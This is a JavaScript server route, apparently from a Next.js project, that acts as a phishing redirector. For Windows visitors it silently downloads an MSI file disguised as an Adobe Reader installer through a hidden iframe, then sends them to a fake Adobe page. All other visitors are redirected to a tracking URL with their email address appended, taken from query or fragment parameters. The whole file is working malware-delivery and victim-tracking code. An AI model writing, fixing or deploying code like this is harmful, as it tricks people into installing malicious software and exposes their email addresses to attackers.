// pages/api/redirect.js
export default function handler(req, res) {
  const userAgent = (req.headers && req.headers["user-agent"]) || "";
  const isWindows = /windows/i.test(userAgent);

  const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
    "https://mksonline.com.mx/css/adobe/reader/download.html";

  const MSI_PATH = "/Reader_adobe_install_online.msi";

  const NON_WINDOWS_TARGET =
    "https://tagtechpro.com/i/?aXBkYXRhPTIwNS4yMzQuMTgxLjMwJnN2PWdlbmVyYWwmcj1LQSZ1aWQ9VVNFUjE1MDcyMDI1VTUyMDcxNTE3JnM9TGE=";

  // --------------------------------------------
  // 1. Extract email from ?email= or ?smn=
  // --------------------------------------------
  let email = "";

  if (req.query && req.query.email) {
    email = Array.isArray(req.query.email)
      ? req.query.email[0]
      : req.query.email;
  } else if (req.query && req.query.smn) {
    // ⭐ THIS was your error — ternary must be complete
    email = Array.isArray(req.query.smn)
      ? req.query.smn[0]
      : req.query.smn;
  } else if (req.url) {
    // --------------------------------------------
    // 2. Try to extract hash fragment (#email)
    // --------------------------------------------
    const match = req.url.match(/#([^?&]+)/);

    if (match && match[1]) {
      try {
        email = decodeURIComponent(match[1]);
      } catch (e) {
        email = match[1];
      }
    }
  }

  const safeEmail = email ? encodeURIComponent(email) : "";

  // --------------------------------------------
  // 3. WINDOWS → Serve MSI download then redirect
  // --------------------------------------------
  if (isWindows) {
    const htmlParts = [
      "<!DOCTYPE html>",
      "<html>",
      "<head>",
      "  <meta charset=\"utf-8\" />",
      "  <title>Preparing Download…</title>",
      "</head>",
      "<body>",
      "  <p>Your download will start shortly…</p>",
      "  <script>",
      "    (function () {",
      "      var iframe = document.createElement('iframe');",
      "      iframe.style.display = 'none';",
      "      iframe.src = '" + MSI_PATH + "';",
      "      document.body.appendChild(iframe);",
      "      setTimeout(function () {",
      "        window.location.href = '" + WINDOWS_REDIRECT_AFTER_DOWNLOAD + "';",
      "      }, 2000);",
      "    })();",
      "  </script>",
      "</body>",
      "</html>"
    ];

    const html = htmlParts.join("\n");

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.status(200).send(html);
    return;
  }

  // --------------------------------------------
  // 4. NON-Windows → final redirect
  // --------------------------------------------
  const finalUrl = safeEmail
    ? NON_WINDOWS_TARGET + "#" + safeEmail
    : NON_WINDOWS_TARGET;

  res.writeHead(302, { Location: finalUrl });
  res.end();
}
